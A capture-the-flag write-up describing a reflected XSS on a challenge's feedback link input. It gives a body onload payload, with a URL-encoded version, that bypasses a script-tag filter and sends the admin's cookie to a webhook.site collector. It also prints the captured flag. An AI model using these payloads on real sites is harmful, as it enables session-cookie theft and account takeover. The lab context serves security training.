# Challenge `Give me more than a simple WAF` Writeup

- Vulnerability: Reflected XSS attack

- Where: On the Feedback link input

- Impact: It allows to inject code that will be executed in the client browser.
  -  With this, we can make the admin click on the link of the feedback, and make him open a site without him knowing (we know that he will for certain open the link that we send on the feedback). With this, we can access the admin cookie. 

- Note: THis is very similar to the previous CTF, the only diference is the HTML element that we are exploiting, in the previous we used `<script>` but now is filtred, so we can use another one like `<body onload="alert(document.cookie)">` that will execute that code loading the fake body that we are sending.

## Steps to reproduce

1. Create a website on [Webhook.site](https://webhook.site) and copy the URL of our fake website that will receive requests.
2. Create a script that will be executed by the client browser to redirect to our malicious website. (e.g, `<body onload ="location='https://webhook.site/<unique-id>/'+document.cookie"`)
3. Encode the script to URL encode to append to the link.
4. Send the link `%3Cbody%20onload%20%3D%22location%3D%27https%3A%2F%2Fwebhook.site%<unique-id>%2F%27%2Bdocument.cookie%22` via feedback.
5. On the [Webhook.site](https://webhook.site) dashboard, analyze the request, and there will be a GET request with `SECRET=SSof{A_good_WAF_was_all_I_needed...}` that is the admin cookie (it might be needed to to a URL decode).